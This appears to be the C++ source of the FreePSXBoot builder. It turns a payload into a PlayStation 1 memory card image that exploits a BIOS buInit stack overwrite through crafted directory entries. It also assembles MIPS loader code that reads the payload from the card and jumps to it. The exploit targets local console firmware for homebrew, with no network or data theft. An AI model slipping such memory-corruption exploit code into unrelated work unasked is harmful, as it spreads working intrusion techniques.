#include <memory.h>
#include <stdint.h>
#include <stdio.h>

#include <array>
#include <string>
#include <unordered_map>
#include <vector>

#include "encoder.hh"
#include "flags.h"

using namespace Mips::Encoder;

struct ExploitSettings {
    uint32_t stackBase;
    uint32_t addressToModify;
    uint32_t originalValue;
    uint32_t newValue;

    constexpr static uint32_t maxFileSizeToUse = 0x7fffc000;
    constexpr static uint32_t maxIncrementPerSlot = 0x1ffff;

    uint16_t index() const noexcept { return static_cast<uint16_t>((addressToModify - stackBase) / 4); }

    uint32_t difference() const noexcept { return newValue - originalValue; }

    int nbSlotsNeeded() const noexcept {
        // Each slot allows to increment at most by 0x1ffff.
        const uint32_t diff = difference();
        int result = (diff / maxIncrementPerSlot);
        result += (diff % maxIncrementPerSlot) == 0 ? 0 : 1;
        return result;
    }

    uint32_t fileSizeToUseForLastSlot() const noexcept { return (difference() % maxIncrementPerSlot) * 0x4000; }

    bool valid() const noexcept {
        // Index must be <= 0xfffe.
        if ((addressToModify - stackBase) / 4 > 0xfffe) {
            return false;
        }
        // 15 slots are usable to increment the value.
        else if (nbSlotsNeeded() > 15) {
            return false;
        } else {
            return true;
        }
    }
};

// Maps BIOS version (e.g. 9002) to its exploits settings.
static std::unordered_map<uint32_t, ExploitSettings> biosExploitSettings = {
    // Overwrite "jal set_card_auto_format", called right after buInit
    {9002, {0x801ffcd0, 0x80231f50, 0x0c01a144, 0x0c082f92}},
};

static void banner() {
    printf("FreePSXBoot memory card builder\n");
    printf("Exploit created by brad-lin\n");
    printf("Builder created by Nicolas \"Pixel\" Noble\n");
    printf("https://github.com/brad-lin/FreePSXBoot\n\n");
}

static void usage() {
    printf(
        "This program can build a memory card using known exploit values for supported BIOS versions,\n"
        "or build an experimental memory card which gives full control of the value modified by the exploit.\n"
        "If you just want to run something on a PlayStation with a supported BIOS version,\n"
        "use -bios with the corresponding option.\n"
        "If you know what you are doing and want to experiment, use the advanced options.\n");
    printf(
        "Usage:\n"
        "\tTo run a payload (standard usage) :\n"
        "\t\tbuilder -bios 9002 -in payload.bin -out card.mcd -tload 0x801b0000\n"
        "\tTo experiment (advanced usage; these example values work on 7000+ BIOS versions):\n"
        "\t\tbuilder -base 0x801ffcd0 -vector 0x802009b4 -old 0x4d3c -new 0xbe48 -in payload.bin -out card.mcd -tload "
        "0x801b0000\n");
    printf("\n");
    printf(
        "-bios     the BIOS version, as 3 or 4 digits (e.g. 9002). If you use this option, don't use base, vector, "
        "old, and new.\n");
    printf("-base     the base address of the stack array being exploited from buInit\n");
    printf(
        "-vector   the address of the value we want to modify. Use 0x802 as a prefix, e.g. 0x802009b4 to modify value "
        "at address 0x09b4.\n");
    printf("-old      the original value to modify\n");
    printf("-new      the new value we want to set\n");
    printf("-in       the payload file; if it is a ps-exe, tload is optional\n");
    printf("-out      the output filename to create\n");
    printf("-tload    if 'in' is a binary payload, use this address to load and jump to\n");
    printf("-return   make a payload that allows returning to the shell\n");
    printf("-noint    disable interrupts during payload\n");
    printf("-nogp     disable setting $gp during payloads\n");
    printf("-deleted  use deleted fake entries\n");
}

static uint32_t getU32(const uint8_t* ptr) {
    uint32_t ret = 0;
    ptr += 3;

    ret |= *ptr--;
    ret <<= 8;
    ret |= *ptr--;
    ret <<= 8;
    ret |= *ptr--;
    ret <<= 8;
    ret |= *ptr--;
    return ret;
}

static int16_t getHI(uint32_t v) {
    int16_t lo = v & 0xffff;
    int16_t hi = v >> 16;
    return lo < 0 ? hi + 1 : hi;
}

static int16_t getLO(uint32_t v) {
    int16_t ret = v & 0xffff;
    return ret;
}

int main(int argc, char** argv) {
    banner();

    const flags::args args(argc, argv);

    auto biosVersionStr = args.get<std::string>("bios");
    auto baseStr = args.get<std::string>("base");
    auto vectorStr = args.get<std::string>("vector");
    auto oldAddrStr = args.get<std::string>("old");
    auto newAddrStr = args.get<std::string>("new");
    auto inName = args.get<std::string>("in");
    auto outName = args.get<std::string>("out");
    auto tloadStr = args.get<std::string>("tload");

    const bool biosVersionPresent = biosVersionStr.has_value();
    const bool anyExpertArgPresent =
        baseStr.has_value() || vectorStr.has_value() || oldAddrStr.has_value() || newAddrStr.has_value();
    const bool allExpertArgsPresent =
        baseStr.has_value() && vectorStr.has_value() && oldAddrStr.has_value() && newAddrStr.has_value();
    // Check in and out presence
    if (!inName.has_value() || !outName.has_value()) {
        usage();
        return -1;
    }
    // Check that none or all expert args are present
    if (anyExpertArgPresent && !allExpertArgsPresent) {
        usage();
        return -1;
    }
    // Check that bios version xor expert args are used
    if (biosVersionPresent && anyExpertArgPresent) {
        usage();
        return -1;
    }

    uint32_t biosVersion;
    uint32_t base;
    uint32_t vector;
    uint32_t oldAddr;
    uint32_t newAddr;
    uint32_t tload = 0;

    const char* argname = nullptr;
    try {
        if (biosVersionPresent) {
            argname = "bios";
            biosVersion = std::stoul(biosVersionStr.value(), nullptr, 0);
        } else {
            argname = "base";
            base = std::stoul(baseStr.value(), nullptr, 0);
            argname = "vector";
            vector = std::stoul(vectorStr.value(), nullptr, 0);
            argname = "oldAddr";
            oldAddr = std::stoul(oldAddrStr.value(), nullptr, 0);
            argname = "newAddr";
            newAddr = std::stoul(newAddrStr.value(), nullptr, 0);
        }
        if (tloadStr.has_value()) {
            argname = "tload";
            tload = std::stoul(tloadStr.value(), nullptr, 0);
        }
    } catch (...) {
        printf("Error parsing argument %s\n", argname);
        return -1;
    }

    struct ExploitSettings exploitSettings;
    if (biosVersionPresent) {
        auto it = biosExploitSettings.find(biosVersion);
        if (it == biosExploitSettings.end()) {
            printf("Unsupported BIOS version %u\n", biosVersion);
            return -1;
        }
        exploitSettings = it->second;
    } else {
        exploitSettings.stackBase = base;
        exploitSettings.addressToModify = vector;
        exploitSettings.originalValue = oldAddr;
        exploitSettings.newValue = newAddr;
    }

    if (!exploitSettings.valid()) {
        printf(
            "Exploit settings are not valid; either too many slots are needed, or the address to modify is out of "
            "range.\n");
        return -1;
    }

    static std::array<uint8_t, 128 * 1024> out;
    memset(out.data(), 0, out.size());
    out[0x0000] = 'M';
    out[0x0001] = 'C';
    out[0x007f] = 0x0e;

    // Write directory entries (as many as needed)
    for (int i = 0; i < exploitSettings.nbSlotsNeeded(); i++) {
        const int offset = (i + 1) * 0x80;
        const bool last = i == exploitSettings.nbSlotsNeeded() - 1;
        uint32_t fileSize = last ? exploitSettings.fileSizeToUseForLastSlot() : ExploitSettings::maxFileSizeToUse;
        // Note: exploit will fail if the value at the fake directory entry is 0xAX or 0x5X, depending of this value.
        // If it fails, change to 0xA1.
        out[offset] = args.get<bool>("delete", false) ? 0xa1 : 0x51;

        out[offset + 4] = fileSize & 0xff;
        fileSize >>= 8;
        out[offset + 5] = fileSize & 0xff;
        fileSize >>= 8;
        out[offset + 6] = fileSize & 0xff;
        fileSize >>= 8;
        out[offset + 7] = fileSize & 0xff;

        uint32_t index = exploitSettings.index();
        out[offset + 8] = index & 0xff;
        index >>= 8;
        out[offset + 9] = index & 0xff;
        out[offset + 0xa] = 'F';
        out[offset + 0xb] = 'r';
        out[offset + 0xc] = 'e';
        out[offset + 0xd] = 'e';
        out[offset + 0xe] = 'P';
        out[offset + 0xf] = 'S';
        out[offset + 0x10] = 'X';
        out[offset + 0x11] = 'B';
        out[offset + 0x12] = 'o';
        out[offset + 0x13] = 'o';
        out[offset + 0x14] = 't';

        uint8_t crc = 0;
        for (unsigned i = 0; i < 0x80; i++) {
            crc ^= out[offset + i];
        }
        out[offset + 0x7f] = crc;
    }

    FILE* inFile = fopen(inName.value().c_str(), "rb");
    if (!inFile) {
        printf("Failed to open input file %s\n", inName.value().c_str());
        return -1;
    }

    fseek(inFile, 0, SEEK_END);
    std::vector<uint8_t> in;
    in.resize(ftell(inFile));
    fseek(inFile, 0, SEEK_SET);
    auto n = fread(in.data(), in.size(), 1, inFile);
    if (n != 1) {
        printf("Failed to read input file %s\n", inName.value().c_str());
        return -1;
    }
    fclose(inFile);

    uint32_t tsize = in.size();
    uint32_t gp = 0;
    uint32_t pc = tload;
    uint32_t sp = 0;

    uint8_t* payloadPtr = in.data();

    if (memcmp(in.data(), "PS-X EXE", 8) == 0) {
        pc = getU32(in.data() + 0x10);
        gp = getU32(in.data() + 0x14);
        tload = getU32(in.data() + 0x18);
        tsize = getU32(in.data() + 0x1c);
        sp = getU32(in.data() + 0x30);
        sp += getU32(in.data() + 0x34);
        payloadPtr = in.data() + 2048;
    } else {
        if (!tloadStr.has_value()) {
            printf("Raw binary and no tload argument.\n");
            usage();
            return -1;
        }
    }

    constexpr unsigned firstUsableFrame = 64;

    if (sp == 0) sp = 0x801ffff0;
    unsigned frames = (tsize + 127) >> 7;
    constexpr unsigned availableFrames = ((128 * 1024) >> 7) - firstUsableFrame;
    if (frames > availableFrames) {
        printf("Payload binary too big. Maximum = %i bytes\n", availableFrames * 128);
        return -1;
    }
    memcpy(out.data() + firstUsableFrame * 128, payloadPtr, tsize);

    std::vector<uint32_t> disableInterrupts = {
        // disabling all interrupts except for memory card
        addiu(Reg::V0, Reg::R0, 128),
        lui(Reg::V1, 0x1f00),
        sw(Reg::V0, 0x1074, Reg::V1),
    };

    std::vector<uint32_t> saveRegisters = {
        addiu(Reg::SP, Reg::SP, -12),
        sw(Reg::RA, 0, Reg::SP),
        sw(Reg::S0, 4, Reg::SP),
        sw(Reg::S1, 8, Reg::SP),
    };

    std::vector<uint32_t> restoreVector = {
        // restoring old vector
        addiu(Reg::V0, Reg::R0, exploitSettings.originalValue),
        sw(Reg::V0, exploitSettings.addressToModify, Reg::R0),
    };

    unsigned lastLoadAddress = tload + 128 * (frames - 1);
    std::vector<uint32_t> loadBinary = {
        // S0 = current frame
        addiu(Reg::S0, Reg::R0, frames),
        // S1 = destination address of current frame
        lui(Reg::S1, getHI(lastLoadAddress)),
        addiu(Reg::S1, Reg::S1, getLO(lastLoadAddress)),
        // read_loop:
        // decrement frame counter
        addi(Reg::S0, Reg::S0, -1),
        // A0 = deviceID (0)
        addiu(Reg::A0, Reg::R0, 0),
        // A1 = frame counter + firstUsableFrame
        addiu(Reg::A1, Reg::S0, firstUsableFrame),
        // A2 = current destination address pointer
        addiu(Reg::A2, Reg::S1, 0),
        // mcReadSector(0, frame, dest)
        jal(0xb0),
        addiu(Reg::T1, Reg::R0, 0x4f),
        // mcWaitForStatus(0);
        addiu(Reg::A0, Reg::R0, 0),
        jal(0xb0),
        addiu(Reg::T1, Reg::R0, 0x5d),
        // if frame counter is not zero, go back 40 bytes (aka read_loop)
        bne(Reg::S0, Reg::R0, -40),
        // decrement destination pointer by sizeof(frame) in the delay slot
        addi(Reg::S1, Reg::S1, -128),
    };

    std::vector<uint32_t> setGP = {
        lui(Reg::GP, getHI(gp)),
        addiu(Reg::GP, Reg::GP, getLO(gp)),
    };

    std::vector<uint32_t> bootstrapReturn = {
        // flush cache
        jal(0xa0),
        addiu(Reg::T1, Reg::R0, 0x44),

        lui(Reg::V0, getHI(pc)),
        addiu(Reg::V0, Reg::V0, getLO(pc)),
        lw(Reg::RA, 0, Reg::SP),
        lw(Reg::S0, 4, Reg::SP),
        lw(Reg::S1, 8, Reg::SP),
        jr(Reg::V0),
        addiu(Reg::SP, Reg::SP, 12),
    };

    std::vector<uint32_t> bootstrapNoReturn = {
        // bootstrap
        lui(Reg::RA, getHI(pc)),
        addiu(Reg::RA, Reg::RA, getLO(pc)),
        lui(Reg::SP, getHI(sp)),
        addiu(Reg::SP, Reg::SP, getLO(sp)),

        // flush cache
        j(0xa0),
        addiu(Reg::T1, Reg::R0, 0x44),
    };

    std::vector<uint32_t> payload;
    auto append = [&payload](std::vector<uint32_t>& block) {
        std::copy(begin(block), end(block), std::back_inserter(payload));
    };
    const bool returnToShell = args.get<bool>("return", false);
    if (args.get<bool>("noint", false)) append(disableInterrupts);
    if (returnToShell) append(saveRegisters);
    append(restoreVector);
    append(loadBinary);
    // as GP is used for relative accessing, unless user-overriden, will be set only if non-zero (aka is used at all)
    if (!args.get<bool>("nogp", gp == 0)) append(setGP);

    if (returnToShell) {
        append(bootstrapReturn);
    } else {
        append(bootstrapNoReturn);
    }
    if (payload.size() > 32) {
        printf("Payload is too big, using %i instructions out of 32.\n", (int)payload.size());
        return -1;
    }
    // Compute payload checksum
    uint8_t crc = 0;
    int crcIndex = 0;
    size_t payloadSize = payload.size() * sizeof(decltype(payload)::value_type);
    const uint8_t* payloadBytes = reinterpret_cast<const uint8_t*>(payload.data());
    while (crcIndex < payloadSize && crcIndex < 127) {
        crc ^= payloadBytes[crcIndex];
        crcIndex++;
    }
    // If payload has 128 bytes, check that the checksum is bad
    if (payloadSize == 128 && crc == payloadBytes[127]) {
        printf("Payload is 128 bytes and its checksum is not bad.\n");
        return -1;
    }
    // Otherwise, make the checksum bad.
    if (crc == 0) {
        out[0x87f] = 0xCD;
    }
    unsigned o = 0;
    for (auto p : payload) {
        out[0x800 + o++] = p & 0xff;
        p >>= 8;
        out[0x800 + o++] = p & 0xff;
        p >>= 8;
        out[0x800 + o++] = p & 0xff;
        p >>= 8;
        out[0x800 + o++] = p & 0xff;
        p >>= 8;
    }

    FILE* outFile = fopen(outName.value().c_str(), "wb");
    if (!outFile) {
        printf("Failed to open output file %s\n", outName.value().c_str());
        return -1;
    }

    fwrite(out.data(), out.size(), 1, outFile);
    fclose(outFile);

    return 0;
}
